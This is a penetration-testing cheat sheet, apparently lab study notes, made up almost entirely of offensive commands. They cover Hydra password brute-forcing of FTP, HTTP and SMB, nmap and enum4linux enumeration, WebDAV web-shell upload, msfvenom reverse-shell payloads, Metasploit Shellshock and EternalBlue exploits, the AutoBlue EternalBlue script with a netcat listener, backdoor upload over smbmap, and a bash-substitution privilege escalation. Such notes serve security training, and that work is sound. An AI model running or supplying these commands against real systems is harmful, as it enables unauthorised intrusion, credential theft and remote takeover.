# Hydra 

Attacking un Common ports
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -L /root/Desktop/wordlists/ftp_Users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://192.253.124.3:5554

# Network

```bash
#Dump IPs withing a Sub Domain
fping -a -g <IP/NW Mask>
fping -a -g 10.1.10.0/24
#show only alive-reachable machines
fping -a -g 10.1.10.0/24 2>/dev/null

#Ping scan. No port
nmap -sn <IP>
nmap -sn <IP> <IP>
nmap -sn <IPRange-IP>
```

# HTTP: 80, 443

#### Nmap
```bash
sudo nmap -p 80 -sV -O <TARGET_IP>

nmap -p 80 --script=http-enum -sV <TARGET_IP>
nmap -p 80 --script=http-headers -sV <TARGET_IP>
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
```

#### Alternative
```bash
#Shows Server & Sight additional data
whatweb <TARGET_IP>

#Shows source code. not the rendered one
http <TARGET_IP>

#Renders page on Ternimal
browsh --startup-url http://<TARGET_IP>

dirb http://<TARGET_IP>
dirb http://<TARGET_IP> /usr/share/metasploit-framework/data/wordlists/directory.txt
dirb http://<TARGET_IP> -u bob:password_123321

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/ #brute http basic auth
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/ #brute http digest
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed" # brute http post form
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v" #brute http authenticated post form

wget <TARGET_IP>
curl <TARGET_IP> | more
curl -I http://<TARGET_IP>/<DIR>
curl --digest -u <USER>:<PW> http://<TARGET_IP>/<DIR>

lynx <TARGET_IP>
```
#### Metasploit
```bash
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_version

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

## set options depends on the selected module
set HTTP_METHOD GET
set TARGETURI /<DIR>/

set USER_FILE <USERS_LIST>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set AUTH_URI /<DIR>/
exploit
```
#### IIS WEBDAV
```bash
# IIS WEBDAV. Shows directory, file creation and execution of it.
davtest -url <URL>
davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav

#upload file. Type of files is shown above in davtest tool 
cadaver [OPTIONS] <URL>
cadaver http://target1.ine.local/webdav
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
#in the tab: dir C:\

nmap -p 80 --script http-enum -sV <TARGET_IP>

msfvenom -p <PAYLOAD> LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f <file_type> > shell.asp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f asp > shell.asp

hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <TARGET_IP> http-get /webdav/
```
```bash
## METASPLOIT
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler
use exploit/windows/iis/iis_webdav_upload_asp

set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>

set HttpUsername <USER>
set HttpPassword <PW>
set PATH /webdav/metasploit.asp
```

#### ShellShock or CGI
```bash
# BASH - APACHE
nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>
#nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/browser.cgi" target1.ine.local
```

```bash
## METASPLOIT
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <TARGET_IP>
set LHOST <eth1>
set TARGETURI /gettime.cgi
exploitget
```

####Bruteforce 
```bash

```

# SMB - 445 or 139 (Netbios)

#### Nmap
```bash
sudo nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -sU --top-ports 25 --open <TARGET_IP>

nmap -p 445 --script smb-protocols <TARGET_IP>
nmap -p 445 --script smb-security-mode <TARGET_IP>

nmap -p 445 --script smb-enum-sessions <TARGET_IP>
nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares <TARGET_IP>
nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-domains--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-groups--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-os-discovery <TARGET_IP>

nmap -p445 --script=smb-vuln-* <TARGET_IP>

# ETERNALBLUE
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>

```

#### Nmblookup
```bash
nmblookup -A <TARGET_IP>
```

#### SMBMap
```bash
smbmap -u guest -p "" -d . -H <TARGET_IP>

smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>

## Run a command
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'
## List all drives
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L
## List dir content
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'
## Upload a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\sample_backdoor'
## Download a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
```

#### SMBClient
```bash
# Connection
smbclient -L <TARGET_IP> -N
smbclient -L <TARGET_IP> -U <USER>
smbclient -L //target2.ine.local -U administrator
smbclient //<TARGET_IP>/<USER> -U <USER>
smbclient //<TARGET_IP>/admin -U admin
smbclient //<TARGET_IP>/public -N #NULL Session

## SMBCLIENT
smbclient //<TARGET_IP>/share_name
help
ls
get <filename>
```

#### RPCClient
```bash
rpcclient -U "" -N <TARGET_IP>
## RPCCLIENT
enumdomusers
enumdomgroups
lookupnames admin
```

#### Enum4Linux
```bash
enum4linux -o <TARGET_IP>
enum4linux -i <TARGET_IP>
enum4linux -U <TARGET_IP>
enum4linux -S <TARGET_IP>
enum4linux -G <TARGET_IP>
enum4linux -U -M -S -P -G <TARGET_IP>
enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>


## NULL SESSIONS

# 1 - Use “enum4linux -n” to make sure if “<20>” exists:
enum4linux -n <TARGET_IP>
# 2 - If “<20>” exists, it means Null Session could be exploited. Utilize the following command to get more details:
enum4linux <TARGET_IP>
# 3 - If confirmed that Null Session exists, you can remotely list all share of the target:
smbclient -L WORKGROUP -I <TARGET_IP> -N -U ""
# 4 - You also can connect the remote server by applying the following command:
smbclient \\\\<TARGET_IP>\\c$ -N -U ""
# 5 - Download those files stored on the share drive:
smb: \> get file_shared.txt
```

#### Hydra
```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz

hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
```
We can use a wordlist generator tools (how Cewl), to create custom wordlists.

#### Metasploit
```bash
# METASPLOIT Starting
msfconsole
msfconsole -q

# METASPLOIT SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/pipe_auditor

## set options depends on the selected module
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser <USER>
set RHOSTS <TARGET_IP>
exploit

# Kali Linux terminal
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"

#Exploit
use exploit/windows/smb/psexec
use exploit/windows/smb/ms17_010_eternalblue

set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false

set SMBUser <USER>
set SMBPass <PW>
```

#### PSEXEC
```bash
psexec.py <USER>@<TARGET_IP> cmd.exe

## Manual Exploit - AutoBlue
cd
mkdir tools
cd /home/kali/tools
sudo git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git 
cd AutoBlue-MS17-010
pip install -r requirements.txt

cd shellcode
chmod +x shell_prep.sh
./shell_prep.sh
# LHOST = Host Kali Linux IP
# LPORT = Port Kali will listen for the reverse shell

nc -nvlp 1234 # On attacker VM

cd ..
chmod +x eternalblue_exploit7.py
python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin
```

# SAMBA

```bash
# SAMBA
smbmap -u <USER> -p '<PW>' -H <TARGET_IP>

smbclient -L <TARGET_IP> -U <USER>

enum4linux -a <TARGET_IP>
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
```

#Meterpreter

```bash
getuid
sysinfo
getprivs
getsystem

##Windows
pgrep lsass
migrate <explorer_PID>
getprivs

``

# FILE

```bash
#read contents of text embedded within the binary
#strings <binary name> in a shell
strings welcome

```

#Linux Priv Escalation

#### Possibility 1
Find a executable which links to another file. Try to edit the other file to embed mallicious code to gain root access

```bash
#find greetings file embedded into welcome executable
strings welcome

#remove original greetings
rm greetings

#make a copy of bash and call it greetings
cp /bin/bash greetings

#execute welcome file
./welcome
```








